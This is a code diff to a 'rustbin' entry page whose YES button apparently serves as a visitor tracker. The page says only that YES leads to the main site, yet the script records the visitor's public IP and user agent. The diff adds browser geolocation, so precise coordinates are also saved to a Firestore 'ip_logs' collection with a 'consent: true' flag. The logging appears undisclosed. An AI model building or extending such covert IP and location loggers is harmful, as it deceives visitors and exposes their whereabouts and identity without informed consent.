@@ -37,16 +37,16 @@
         </h1>
         <p id="question" class="text-lg md:text-xl text-neutral-300">open rustbin?</p>
         <div id="actions" class="flex items-center justify-center gap-4">
-          <button id="yesBtn" class="px-5 py-2.5 rounded-xl border border-emerald-400/50 hover:border-emerald-400 hover:translate-y-[-1px] transition font-semibold">
+          <button id="yesBtn" class="px-5 py-2.5 rounded-xl border border-emerald-400/50 hover:border-emerald-400 hover:-translate-y-1 transition font-semibold">
             YES
           </button>
-          <button id="noBtn" class="px-5 py-2.5 rounded-xl border border-red-400/50 hover:border-red-400 hover:translate-y-[-1px] transition font-semibold">
+          <button id="noBtn" class="px-5 py-2.5 rounded-xl border border-red-400/50 hover:border-red-400 hover:-translate-y-1 transition font-semibold">
             NO
           </button>
         </div>
         <p id="status" class="h-6 text-sm"></p>
         <div class="text-xs text-neutral-400 leading-relaxed max-w-xl mx-auto">
-          By clicking <span class="text-emerald-300 font-semibold">YES</span>, you move to main page rustbin.
+          By clicking <span class="text-emerald-300 font-semibold">YES</span>, you move to main page rustbin.<br>
           Click <span class="text-red-300 font-semibold">NO</span> to decline and leave the site.
         </div>
       </div>
@@ -130,6 +130,24 @@
       throw lastErr || new Error('All IP providers failed');
     }
 
+    function getGeoLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject('Geolocation not supported');
+        } else {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              resolve({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+              });
+            },
+            err => reject(err.message)
+          );
+        }
+      });
+    }
+
     yesBtn.addEventListener('click', async () => {
       yesBtn.disabled = true;
       noBtn.disabled = true;
@@ -140,14 +158,28 @@
         if (!db) throw new Error('Firestore not initialized');
         const ip = await getPublicIP();
         const ua = navigator.userAgent || 'unknown';
-        const docId = ip.replace(/\./g, '_'); // Use IP as document ID
+        const docId = ip.replace(/\./g, '_'); // заменяем точки в IP на нижнее подчёркивание
 
-        await setDoc(doc(db, 'ip_logs', docId), {
+        let geo = null;
+        try {
+          geo = await getGeoLocation();
+        } catch (geoErr) {
+          console.warn('Geolocation failed:', geoErr);
+        }
+
+        const dataToSave = {
           ip,
           ua,
           consent: true,
-          ts: serverTimestamp()
-        });
+          ts: serverTimestamp(),
+        };
+        if (geo) {
+          dataToSave.geo = geo;
+        }
+
+        console.log('Saving document with ID:', docId, dataToSave);
+
+        await setDoc(doc(db, 'ip_logs', docId), dataToSave);
 
         setStatus('Successful!', 'text-emerald-400 font-semibold');
       } catch (e) {
